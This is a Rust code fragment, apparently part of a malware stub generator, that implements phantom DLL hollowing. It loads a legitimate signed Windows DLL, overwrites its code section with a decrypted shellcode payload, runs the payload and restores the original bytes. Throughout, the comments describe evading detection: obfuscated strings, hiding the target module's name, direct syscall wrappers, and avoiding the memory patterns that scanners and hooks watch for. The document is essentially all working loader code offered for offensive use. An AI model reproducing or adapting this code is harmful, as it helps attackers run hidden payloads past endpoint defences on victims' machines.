// Phantom DLL hollowing (technique fragment)
//
// This file is injected verbatim into the generated stub when the technique is
// selected. It must be a self-contained Rust snippet: its own `use` statements
// plus the functions/constants the technique needs.
//
// A per-build value is rendered as a placeholder token that
// `Params::render_fragment_for` replaces with the actual value. The delimiter is
// not valid Rust outside a macro, so `rustfmt` cannot parse the file and leaves
// the tokens untouched. Do NOT switch the delimiter to double braces: those are
// valid Rust (nested blocks) and `rustfmt` silently rewrites them, breaking the
// substitution.
//
// Every string that reaches the generated stub must be built through
// `StringsConfig::obfuscate` (see `src/techniques/README.md`).
//
// What the fragment does:
//   1. loads the sacrificial, signed module with `LoadLibraryA` (a loader entry
//      point, like `CreateProcessA` in `process_hollowing`: the `nt_*` layer
//      issues kernel calls, it does not map images),
//   2. walks the module's *mapped* PE headers to its code section (`.text`),
//   3. saves the first bytes of that section into a `nt_alloc_vm` buffer, so the
//      original entry/prologue can be put back once the payload has run,
//   4. makes only the pages the payload occupies writable through
//      `crate::nt_protect_vm`, copies the payload over the section's first bytes
//      and restores the loader's own protection (so the section is never RWX),
//   5. calls the payload directly, which keeps the step *returning*: the exit
//      code becomes the step's result and the runtime chain can continue,
//   6. restores the saved bytes — making the section writable, copying them back
//      and restoring the protection again — so the module's exports keep
//      proxying their real implementation instead of stale payload bytes.

use std::ffi::c_void;
use std::ptr;

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows::Win32::System::Threading::GetCurrentProcess;

/// Entry-point signature of the payload: no arguments, exit code as the result
/// (the same contract the reflective-loading shellcode runner uses).
type PayloadEntry = unsafe extern "system" fn() -> u32;

/// Bytes of the hollowing target's PE headers copied out before the walk. Every
/// loaded image maps at least its first page, and no real DLL's headers come
/// anywhere near one page.
const HEADER_BYTES: usize = 0x1000;

/// `IMAGE_DOS_SIGNATURE` ("MZ") and `IMAGE_NT_SIGNATURE` ("PE\0\0").
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;

/// `IMAGE_DOS_HEADER::e_lfanew`: the NT header's offset.
const E_LFANEW_OFFSET: usize = 0x3C;

/// `IMAGE_SIZEOF_SECTION_HEADER`: the distance between two section headers.
const SECTION_HEADER_SIZE: usize = 40;

/// `IMAGE_NT_HEADERS` up to the optional header (signature + `IMAGE_FILE_HEADER`),
/// and the two file-header fields the walk needs: `NumberOfSections` and
/// `SizeOfOptionalHeader`. Both offsets are the same in PE32 and PE32+.
const NT_HEADERS_FIXED: usize = 24;
const NUM_SECTIONS_OFFSET: usize = 6;
const OPTIONAL_HEADER_SIZE_OFFSET: usize = 20;

/// `IMAGE_SECTION_HEADER` fields the walk needs: `Misc.VirtualSize`,
/// `VirtualAddress` and `SizeOfRawData`.
const SECTION_VIRTUAL_SIZE_OFFSET: usize = 8;
const SECTION_VIRTUAL_ADDRESS_OFFSET: usize = 12;
const SECTION_RAW_SIZE_OFFSET: usize = 16;

/// 4 KiB, the granularity `NtProtectVirtualMemory` works in (`dwPageSize`). A
/// constant rather than a query: every x86/x64 Windows uses 4 KiB pages, and the
/// alternative would be another import (`GetSystemInfo`) for a value the stub
/// does not otherwise need.
const PAGE_SIZE: usize = 0x1000;

/// The code section's name (`.text`), compared as its 8-byte little-endian
/// value. A byte pattern instead of a string literal, so the section name is a
/// compile-time constant and never reaches `.rdata`.
const CODE_SECTION_NAME: u64 = u64::from_le_bytes([b'.', b't', b'e', b'x', b't', 0, 0, 0]);

/// The hollowing target's code section: what the payload overwrites, where it
/// starts executing, and what is restored afterwards.
struct CodeSection {
    /// First byte of the section in the *mapped* image (module base + RVA). The
    /// file offset is irrelevant: the loader mapped the section at its RVA.
    start: *mut u8,
    /// `max(VirtualSize, SizeOfRawData)`: the section's content as the loader
    /// mapped it. A payload that does not fit is rejected, never truncated.
    capacity: usize,
}

/// Appends a failed `nt_*` call's NTSTATUS to an obfuscated message.
fn with_status(message: String, status: i32) -> String {
    format!("{message} (status 0x{:08x})", status as u32)
}

/// Appends the byte counts of a size mismatch to an obfuscated message.
fn with_sizes(message: String, payload: usize, capacity: usize) -> String {
    format!("{message} ({payload} > {capacity} bytes)")
}

/// Appends the hollowing target's name to an obfuscated message.
fn with_module(message: String, module: &str) -> String {
    format!("{message} ({module})")
}

/// Reads a `u16` out of a PE buffer, refusing to read past its end.
///
/// The walk below can only leave the buffer on a malformed image (or one whose
/// headers exceed [`HEADER_BYTES`]); reporting that beats a panic.
fn read_u16(pe: &[u8], offset: usize) -> Result<u16, String> {
    let bytes = pe.get(offset..offset + 2).ok_or_else(|| $MSG_HEADERS$)?;
    Ok(u16::from_le_bytes([bytes[0], bytes[1]]))
}

/// Reads a `u32` out of a PE buffer (see [`read_u16`]).
fn read_u32(pe: &[u8], offset: usize) -> Result<u32, String> {
    let bytes = pe.get(offset..offset + 4).ok_or_else(|| $MSG_HEADERS$)?;
    Ok(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
}

/// Reads an 8-byte field (a section name) out of a PE buffer (see [`read_u16`]).
fn read_u64(pe: &[u8], offset: usize) -> Result<u64, String> {
    let bytes = pe.get(offset..offset + 8).ok_or_else(|| $MSG_HEADERS$)?;
    Ok(u64::from_le_bytes([
        bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5], bytes[6], bytes[7],
    ]))
}

/// Whether `image` looks like a PE image rather than raw shellcode.
///
/// A PE payload would need a mapper (relocations, imports, per-section
/// protections). `plan::validate` is the real guard for that combination; this
/// check turns a mis-declared `format: pe`/`dll` into a clear error instead of a
/// jump into a DOS header.
fn looks_like_a_pe(image: &[u8]) -> bool {
    if image.len() < 2 || image[0] != b'M' || image[1] != b'Z' {
        return false;
    }
    let Ok(nt) = read_u32(image, E_LFANEW_OFFSET) else {
        return false;
    };
    read_u32(image, nt as usize).is_ok_and(|signature| signature == IMAGE_NT_SIGNATURE)
}

/// Finds the code section of the module mapped at `base`.
///
/// The headers are copied into a local buffer first, so the section walk is
/// plain bounds-checked slice arithmetic instead of raw-pointer reads.
fn find_code_section(base: *mut u8) -> Result<CodeSection, String> {
    let mut headers = [0u8; HEADER_BYTES];
    // SAFETY: `base` is the module base returned by `LoadLibraryA`. The loader
    // maps at least the image's first page — the PE headers — as readable
    // memory, so the copy stays inside the module.
    unsafe { ptr::copy_nonoverlapping(base, headers.as_mut_ptr(), HEADER_BYTES) };

    if read_u16(&headers, 0)? != IMAGE_DOS_SIGNATURE {
        return Err($MSG_HEADERS$);
    }
    let nt = read_u32(&headers, E_LFANEW_OFFSET)? as usize;
    if read_u32(&headers, nt)? != IMAGE_NT_SIGNATURE {
        return Err($MSG_HEADERS$);
    }

    let count = read_u16(&headers, nt + NUM_SECTIONS_OFFSET)? as usize;
    let optional_size = read_u16(&headers, nt + OPTIONAL_HEADER_SIZE_OFFSET)? as usize;
    let mut section = nt + NT_HEADERS_FIXED + optional_size;

    // The RVAs come from a module the system loader mapped, not from the
    // payload, so they are trusted; a surprising one still fails loudly through
    // the bounds-checked reads instead of faulting the stub.
    for _ in 0..count {
        if read_u64(&headers, section)? == CODE_SECTION_NAME {
            let virtual_size = read_u32(&headers, section + SECTION_VIRTUAL_SIZE_OFFSET)? as usize;
            let virtual_address =
                read_u32(&headers, section + SECTION_VIRTUAL_ADDRESS_OFFSET)? as usize;
            let raw_size = read_u32(&headers, section + SECTION_RAW_SIZE_OFFSET)? as usize;
            let capacity = virtual_size.max(raw_size);
            if capacity == 0 {
                return Err($MSG_NO_CODE_SECTION$);
            }
            // SAFETY: the RVA points inside the image mapping `LoadLibraryA`
            // created for `base`.
            let start = unsafe { base.add(virtual_address) };
            return Ok(CodeSection { start, capacity });
        }
        section += SECTION_HEADER_SIZE;
    }
    Err($MSG_NO_CODE_SECTION$)
}

/// Runs the decrypted payload from the code section of a legitimate module, then
/// puts the module's original bytes back.
///
/// The hollowing target is substituted at build time by `render_fragment_for`
/// with code that rebuilds the name at runtime, so it never appears in `strings`.
pub fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    if image.is_empty() {
        return Err($MSG_EMPTY_PAYLOAD$);
    }
    if looks_like_a_pe(image) {
        return Err($MSG_PE_PAYLOAD$);
    }

    let module_name: String = $MODULE_DEF$;
    crate::tech_dbg!(
        "dll_hollowing",
        "hollowing target '{module_name}', payload {} bytes",
        image.len()
    );

    // 1. Load the sacrificial module: the real loader maps it from disk with the
    //    protections a module normally has, which is the whole point of the
    //    technique (the payload's bytes end up in a module the image already
    //    maps, not in a private allocation).
    let module_name_c =
        std::ffi::CString::new(module_name.as_str()).map_err(|_| $MSG_LOAD_FAILED$)?;
    let module = match unsafe { LoadLibraryA(PCSTR(module_name_c.as_ptr() as *const u8)) } {
        Ok(module) => module,
        Err(_) => return Err(with_module($MSG_LOAD_FAILED$, &module_name)),
    };
    crate::tech_dbg!("dll_hollowing", "target mapped at {:#p}", module.0);

    // 2. Locate the code section and check the payload fits it. Silently
    //    truncating, or writing past the section into whatever the loader put
    //    next, would both corrupt the target: fail the load instead.
    let section = find_code_section(module.0 as *mut u8)?;
    if image.len() > section.capacity {
        return Err(with_sizes($MSG_TOO_LARGE$, image.len(), section.capacity));
    }
    let payload_len = image.len();

    // 3. Save the section's first bytes so the module can be restored and keep
    //    proxying its exports. A default-heap `Vec` would put the saved original
    //    code in the loader's private memory; `nt_alloc_vm` keeps it out of the
    //    heap, where a scanner groups private regions by module, and keeps the
    //    allocation on the syscall layer.
    let process = unsafe { GetCurrentProcess() };
    let mut saved: *mut c_void = ptr::null_mut();
    let mut saved_len = payload_len;
    let status = crate::nt_alloc_vm(
        process,
        &mut saved,
        0,
        &mut saved_len,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 || saved.is_null() {
        return Err(with_status($MSG_ALLOC_FAILED$, status));
    }
    // SAFETY: `saved` is a read+write region of at least `payload_len` bytes, and
    // `section.start` points into the module mapped in step 1, so the two regions
    // cannot overlap.
    unsafe { ptr::copy_nonoverlapping(section.start, saved as *mut u8, payload_len) };

    // 4. Make writable only the pages the payload occupies, not the whole
    //    section: the rest of the module's code keeps its original protection.
    //    The pages are writable and *not* executable during the write, so the
    //    section is never RWX.
    let start = section.start as usize;
    let page = start & !(PAGE_SIZE - 1);
    let head = start - page;
    let span = (head + payload_len + PAGE_SIZE - 1) & !(PAGE_SIZE - 1);

    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        process,
        page as *mut c_void,
        span,
        PAGE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err(with_status($MSG_PROTECT_FAILED$, status));
    }

    //    This is our own address space, so a plain copy beats `nt_write_vm`: one
    //    fewer call for a hook to watch, no partial-write failure mode, and
    //    nothing that resembles a cross-process write.
    //
    //    SAFETY: `section.start` points into the module mapped in step 1, the
    //    pages covering `payload_len` bytes from it are writable (step 4), and
    //    `image` is a separate allocation, so the two regions cannot overlap.
    unsafe { ptr::copy_nonoverlapping(image.as_ptr(), section.start, payload_len) };

    //    Restore what the loader had: `.text` ships `PAGE_EXECUTE_READ`, so the
    //    section is executable — and no longer writable — again. The payload runs
    //    only after this succeeds; a section left read-write would fault on the
    //    first instruction.
    let mut restored = 0u32;
    let status = crate::nt_protect_vm(
        process,
        page as *mut c_void,
        span,
        old_protect,
        &mut restored,
    );
    if status < 0 {
        return Err(with_status($MSG_RESTORE_FAILED$, status));
    }

    // 5. Hand control to the payload with a direct call, so it returns here and
    //    the runtime chain can continue. It runs in *this* process, so repoint
    //    the PEB command line at its configured arguments first, exactly like
    //    `reflective_loading` and `module_stomping` do for their payloads.
    crate::patch_command_line()?;
    // SAFETY: the section's first bytes now hold the decrypted payload and the
    // pages are executable again (step 4). The payload is raw,
    // position-independent code whose contract is a no-argument call.
    let entry: PayloadEntry = unsafe { std::mem::transmute(section.start) };
    crate::tech_dbg!("dll_hollowing", "executing the payload from {entry:p}");
    let exit_code = unsafe { entry() };

    // 6. Restore the saved bytes so the module keeps proxying its exports: any
    //    code in the process that later calls a function whose prologue the
    //    payload overwrote gets the real implementation, not stale bytes. The
    //    protection dance is the same as step 4: writable, copy back, restore.
    let mut writable = 0u32;
    let status = crate::nt_protect_vm(
        process,
        page as *mut c_void,
        span,
        PAGE_READWRITE.0,
        &mut writable,
    );
    if status < 0 {
        return Err(with_status($MSG_PROTECT_FAILED$, status));
    }
    // SAFETY: `saved` still holds the original bytes (they were never touched
    // after step 3), the pages are writable again, and `payload_len` is the same
    // length that was copied out.
    unsafe { ptr::copy_nonoverlapping(saved as *mut u8, section.start, payload_len) };
    let mut final_restored = 0u32;
    let status = crate::nt_protect_vm(
        process,
        page as *mut c_void,
        span,
        old_protect,
        &mut final_restored,
    );
    if status < 0 {
        return Err(with_status($MSG_RESTORE_FAILED$, status));
    }

    Ok(exit_code as i32)
}
